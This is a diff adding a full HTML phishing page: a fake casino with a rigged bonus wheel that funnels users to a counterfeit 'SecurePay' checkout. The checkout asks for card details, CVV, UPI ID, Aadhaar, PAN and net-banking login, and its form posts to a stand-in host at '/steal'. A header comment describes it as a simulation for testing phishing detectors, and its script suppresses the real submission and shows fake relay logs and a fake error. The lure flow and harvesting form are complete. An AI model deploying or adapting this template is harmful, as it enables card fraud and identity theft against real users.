@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Royal Crown Casino | Spin to Win Big</title>
+    <!-- 
+        CYBERSECURITY RESEARCH NOTE: 
+        This is a high-fidelity malicious gambling simulation.
+        PURPOSE: Testing browser extensions for 'Social Engineering' & 'Phishing' detection.
+        
+        FRAUD SIGNALS:
+        1. Social Engineering: Interactive "Wheel" game used to lower user inhibitions.
+        2. Technical: Form action = http://malicious-gateway-test.com/steal.
+        3. PII Harvesting: Requests for Aadhaar, PAN, and Net Banking ID in 'Verification'.
+        4. Behavioral: UI Ghosting/locking during the "Tokenization" phase.
+    -->
+    <style>
+        :root {
+            --gold: #d4af37;
+            --gold-light: #f1c40f;
+            --dark-bg: #0f172a;
+            --card-bg: #1e293b;
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --success-green: #22c55e;
+            --primary-blue: #1a365d;
+            --error-red: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-main);
+            overflow-x: hidden;
+        }
+
+        /* Navigation */
+        nav {
+            background: rgba(15, 23, 42, 0.98);
+            padding: 1rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #334155;
+            position: sticky;
+            top: 0;
+            z-index: 500;
+        }
+
+        .logo {
+            font-size: 1.4rem;
+            font-weight: 900;
+            color: var(--gold);
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .wallet-status {
+            background: #1e293b;
+            padding: 0.6rem 1.2rem;
+            border-radius: 50px;
+            border: 1px solid var(--gold);
+            font-weight: 700;
+            color: var(--gold);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Hero & Game Area */
+        .game-container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 2rem;
+            padding: 0 1rem;
+        }
+
+        .wheel-section {
+            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
+            border-radius: 20px;
+            padding: 4rem 2rem;
+            text-align: center;
+            border: 1px solid #334155;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* The Spinning Wheel */
+        .wheel-wrapper {
+            position: relative;
+            width: 350px;
+            height: 350px;
+            margin: 0 auto 2rem;
+        }
+
+        #wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 10px solid var(--gold);
+            transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1);
+            background: conic-gradient(
+                #d4af37 0deg 45deg, 
+                #1e293b 45deg 90deg, 
+                #d4af37 90deg 135deg, 
+                #1e293b 135deg 180deg, 
+                #d4af37 180deg 225deg, 
+                #1e293b 225deg 270deg, 
+                #d4af37 270deg 315deg, 
+                #1e293b 315deg 360deg
+            );
+            box-shadow: 0 0 50px rgba(212, 175, 55, 0.2);
+        }
+
+        .wheel-pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 40px;
+            background: var(--gold-light);
+            clip-path: polygon(50% 100%, 0 0, 100% 0);
+            z-index: 10;
+        }
+
+        .spin-btn {
+            background: var(--gold);
+            color: #000;
+            border: none;
+            padding: 1rem 3rem;
+            font-size: 1.2rem;
+            font-weight: 800;
+            border-radius: 5px;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.4);
+        }
+
+        .spin-btn:disabled {
+            background: #475569;
+            cursor: not-allowed;
+        }
+
+        /* Skip Button - THE HOOK */
+        .skip-container {
+            margin-top: 1.5rem;
+        }
+
+        .skip-link {
+            color: var(--text-dim);
+            text-decoration: underline;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .skip-link:hover {
+            color: var(--gold);
+        }
+
+        /* Lobby Sidebar */
+        .lobby-sidebar {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 1.5rem;
+            border: 1px solid #334155;
+        }
+
+        .lobby-sidebar h3 {
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 0.5rem;
+        }
+
+        .mini-game {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            background: #0f172a;
+            padding: 1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .mini-game:hover {
+            transform: translateX(5px);
+            border: 1px solid var(--gold);
+        }
+
+        .mini-game .icon {
+            font-size: 1.5rem;
+            background: #1e293b;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+        }
+
+        /* --- PAYMENT GATEWAY VIEW --- */
+        #gateway-view {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #f7fafc;
+            z-index: 1000;
+            overflow-y: auto;
+            color: #4a5568;
+        }
+
+        .gateway-header {
+            background: white;
+            padding: 1.2rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .gateway-main {
+            max-width: 950px;
+            margin: 2rem auto;
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            gap: 2rem;
+            padding: 0 1rem;
+        }
+
+        .payment-card {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 25px rgba(0,0,0,0.06);
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 700;
+            margin-bottom: 0.4rem;
+            color: #2d3748;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #cbd5e0;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+
+        /* KYC Expansion - FRAUD SIGNAL */
+        .verification-box {
+            margin-top: 1.5rem;
+            background: #f8fafc;
+            border: 1px dashed #cbd5e0;
+            border-radius: 8px;
+            padding: 1rem;
+        }
+
+        .verification-trigger {
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--primary-blue);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        #kyc-fields {
+            display: none;
+            margin-top: 1rem;
+        }
+
+        /* Processing Overlay */
+        #overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255,255,255,0.98);
+            z-index: 2000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e2e8f0;
+            border-top: 5px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .log-box {
+            width: 380px;
+            height: 120px;
+            background: #1a202c;
+            color: #48bb78;
+            padding: 1rem;
+            font-family: monospace;
+            font-size: 12px;
+            border-radius: 6px;
+            margin-top: 2rem;
+            text-align: left;
+            overflow: hidden;
+        }
+
+        .error-box {
+            display: none;
+            max-width: 400px;
+            margin-top: 2rem;
+        }
+
+        .blur { filter: blur(8px); pointer-events: none; user-select: none; }
+
+        .btn-deposit {
+            width: 100%;
+            padding: 1rem;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- CASINO LOBBY -->
+    <div id="casino-lobby">
+        <nav>
+            <div class="logo">👑 ROYAL CROWN</div>
+            <div class="wallet-status">
+                <span>Wallet: ₹0.00</span>
+                <button onclick="showGateway()" style="background: var(--gold); border: none; padding: 4px 12px; border-radius: 4px; font-weight: 800; cursor: pointer;">Deposit</button>
+            </div>
+        </nav>
+
+        <div class="game-container">
+            <main>
+                <div class="wheel-section">
+                    <h2 style="font-size: 2.2rem; margin-bottom: 0.5rem;">WHEEL OF <span style="color: var(--gold);">FORTUNE</span></h2>
+                    <p style="color: var(--text-dim); margin-bottom: 2rem;">Spin to win up to 500% Deposit Bonus!</p>
+                    
+                    <div class="wheel-wrapper">
+                        <div class="wheel-pointer"></div>
+                        <div id="wheel"></div>
+                    </div>
+
+                    <button class="spin-btn" id="spin-trigger" onclick="spinWheel()">Spin for Bonus</button>
+
+                    <div class="skip-container">
+                        <span class="skip-link" onclick="showGateway()">Skip Game & Land on Deposit Page →</span>
+                    </div>
+                </div>
+            </main>
+
+            <aside class="lobby-sidebar">
+                <h3>Live Games Lobby</h3>
+                
+                <div class="mini-game" onclick="showGateway()">
+                    <div class="icon">🎰</div>
+                    <div>
+                        <div style="font-weight: 700;">Classic Slots</div>
+                        <div style="font-size: 0.7rem; color: var(--text-dim);">Min Deposit: ₹500</div>
+                    </div>
+                </div>
+
+                <div class="mini-game" onclick="showGateway()">
+                    <div class="icon">🃏</div>
+                    <div>
+                        <div style="font-weight: 700;">VIP Blackjack</div>
+                        <div style="font-size: 0.7rem; color: var(--text-dim);">Live Dealers Active</div>
+                    </div>
+                </div>
+
+                <div class="mini-game" onclick="showGateway()">
+                    <div class="icon">🎡</div>
+                    <div>
+                        <div style="font-weight: 700;">Live Roulette</div>
+                        <div style="font-size: 0.7rem; color: var(--text-dim);">24/7 Global Access</div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 2rem; padding: 1rem; background: rgba(212, 175, 55, 0.1); border-radius: 10px; border: 1px solid var(--gold);">
+                    <p style="font-size: 0.8rem; font-weight: 700; color: var(--gold);">Limited Offer!</p>
+                    <p style="font-size: 0.7rem; color: var(--text-dim);">Verify your account (KYC) now to get ₹2,500 instant credit.</p>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- MALICIOUS PAYMENT GATEWAY VIEW -->
+    <div id="gateway-view">
+        <header class="gateway-header">
+            <div style="color: var(--primary-blue); font-weight: 800; font-size: 1.2rem; display: flex; align-items: center; gap: 8px;">
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="#38a169"><path d="M10 2a5 5 0 00-5 5v2a2 2 0 00-2 2v5a2 2 0 002 2h10a2 2 0 002-2v-5a2 2 0 00-2-2V7a5 5 0 00-5-5zM7 7a3 3 0 116 0v2H7V7zm3 9a1 1 0 100-2 1 1 0 000 2z"/></svg>
+                SecurePay Gateway
+            </div>
+            <div style="font-size: 0.7rem; color: #a0aec0; font-weight: bold; border: 1px solid #e2e8f0; padding: 4px 8px; border-radius: 4px;">
+                SECURE 256-BIT ENCRYPTION
+            </div>
+        </header>
+
+        <div class="gateway-main">
+            <section class="payment-card">
+                <h3 style="color: var(--primary-blue); margin-bottom: 1.5rem; border-bottom: 1px solid #edf2f7; padding-bottom: 0.5rem;">Secure Checkout</h3>
+                
+                <!-- FRAUD SIGNAL: External malicious POST destination -->
+                <form id="harvest-form" action="http://malicious-gateway-test.com/steal" method="POST">
+                    
+                    <div class="input-group">
+                        <label>Cardholder Name</label>
+                        <input type="text" name="holder" placeholder="Full name as on card" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Card Number</label>
+                        <input type="text" id="card_num" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+                        <div class="input-group">
+                            <label>Expiry Date</label>
+                            <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="input-group">
+                            <label>CVV</label>
+                            <input type="password" name="cvv" placeholder="***" maxlength="3" required>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>UPI ID (Alternative verification)</label>
+                        <input type="text" name="upi" placeholder="username@bank">
+                    </div>
+
+                    <!-- FRAUD SIGNAL: Over-collection of national IDs -->
+                    <div class="verification-box">
+                        <div class="verification-trigger" onclick="toggleKYC()">
+                            Unlock KYC Verification Bonus (Recommended)
+                            <span>[Expand]</span>
+                        </div>
+                        <div id="kyc-fields">
+                            <p style="font-size: 0.7rem; color: #718096; margin-bottom: 1rem;">Verify your identity to unlock instant withdrawals and bonus credits.</p>
+                            
+                            <div class="input-group">
+                                <label>Aadhaar Number</label>
+                                <input type="text" name="aadhaar" placeholder="12-digit UID">
+                            </div>
+                            
+                            <div class="input-group">
+                                <label>PAN Number</label>
+                                <input type="text" name="pan" placeholder="ABCDE1234F">
+                            </div>
+
+                            <div class="input-group">
+                                <label>Net Banking ID</label>
+                                <input type="text" name="netbank_id" placeholder="Bank Login ID">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-deposit">Confirm Deposit & Play</button>
+                </form>
+
+                <div style="margin-top: 1.5rem; text-align: center;">
+                    <button onclick="hideGateway()" style="background: none; border: none; color: #a0aec0; text-decoration: underline; cursor: pointer; font-size: 0.8rem;">Cancel and return to Royal Crown</button>
+                </div>
+            </section>
+
+            <aside>
+                <div style="background: white; padding: 1.5rem; border-radius: 12px; border: 1px solid #e2e8f0;">
+                    <h4 style="margin-bottom: 1rem; color: var(--primary-blue);">Deposit Summary</h4>
+                    <div style="display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 0.5rem;">
+                        <span>Deposit Amount:</span>
+                        <span>₹2,500.00</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 1rem;">
+                        <span>Processing Fee:</span>
+                        <span style="color: var(--success-green);">FREE</span>
+                    </div>
+                    <div style="border-top: 2px solid #edf2f7; padding-top: 1rem; font-weight: 800; display: flex; justify-content: space-between; color: var(--primary-blue);">
+                        <span>Total Payable:</span>
+                        <span>₹2,500.00</span>
+                    </div>
+                </div>
+
+                <div style="margin-top: 1.5rem; padding: 1rem; font-size: 0.7rem; color: #cbd5e0; line-height: 1.4;">
+                    Ref: RYG-CAS-99120<br>
+                    Merchant: GLOBAL RETAIL LTD<br>
+                    Status: Awaiting Verification
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- PROCESSING OVERLAY -->
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 id="status-text" style="margin-top: 2rem; color: var(--primary-blue);">Routing to Secure Banking Interface...</h2>
+        <div class="log-box" id="terminal">
+            [SYS] Initialization...<br>
+            [NET] Connecting to primary node...<br>
+        </div>
+        <div class="error-box" id="error-screen">
+            <div style="color: var(--error-red); font-weight: 800; font-size: 1.2rem;">🚫 CONNECTION ERROR</div>
+            <p style="color: #718096; margin-top: 0.5rem;">The gateway timed out while synchronizing your verification data. No funds were debited.</p>
+            <button onclick="location.reload()" class="btn-deposit" style="margin-top: 1.5rem;">Retry Deposit</button>
+        </div>
+    </div>
+
+    <script>
+        /* CASINO LOGIC */
+        function spinWheel() {
+            const wheel = document.getElementById('wheel');
+            const btn = document.getElementById('spin-trigger');
+            btn.disabled = true;
+
+            const randomDegree = 1800 + Math.floor(Math.random() * 360);
+            wheel.style.transform = `rotate(${randomDegree}deg)`;
+
+            setTimeout(() => {
+                alert("CONGRATULATIONS! You won a 300% Deposit Bonus! Redirecting to secure deposit page...");
+                showGateway();
+            }, 4500);
+        }
+
+        /* GATEWAY LOGIC */
+        function showGateway() {
+            document.getElementById('gateway-view').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function hideGateway() {
+            document.getElementById('gateway-view').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function toggleKYC() {
+            const f = document.getElementById('kyc-fields');
+            f.style.display = f.style.display === 'block' ? 'none' : 'block';
+        }
+
+        /* FRAUD SIMULATION LOGIC */
+        const form = document.getElementById('harvest-form');
+        const overlay = document.getElementById('overlay');
+        const terminal = document.getElementById('terminal');
+        const status = document.getElementById('status-text');
+        const gate = document.getElementById('gateway-view');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Behavioral Signal: UI Locking/Ghosting
+            gate.classList.add('blur');
+            overlay.style.display = 'flex';
+
+            setTimeout(() => {
+                addLog("[ENC] Card data encrypted (SHA-256)");
+                addLog("[SYS] Relaying PII to central ledger...");
+            }, 1000);
+
+            setTimeout(() => {
+                status.textContent = "Tokenizing Identity Assets...";
+                addLog("[NET] Uplink established: 172.67.x.xx");
+                addLog("[SYS] Scrubbing security headers...");
+            }, 3000);
+
+            // Step 3: Fake Failure (Exfiltration Complete)
+            setTimeout(() => {
+                status.style.display = 'none';
+                document.querySelector('.spinner').style.display = 'none';
+                terminal.style.display = 'none';
+                document.getElementById('error-screen').style.display = 'block';
+                addLog("[ERR] Socket reset by peer.");
+            }, 6000);
+        });
+
+        function addLog(t) {
+            const d = document.createElement('div');
+            d.textContent = t;
+            terminal.appendChild(d);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        /* FORMATTERS */
+        document.getElementById('card_num').addEventListener('input', function (e) {
+            let v = e.target.value.replace(/\D/g, '').match(/.{1,4}/g);
+            if (v) e.target.value = v.join(' ');
+        });
+    </script>
+</body>
+</html>
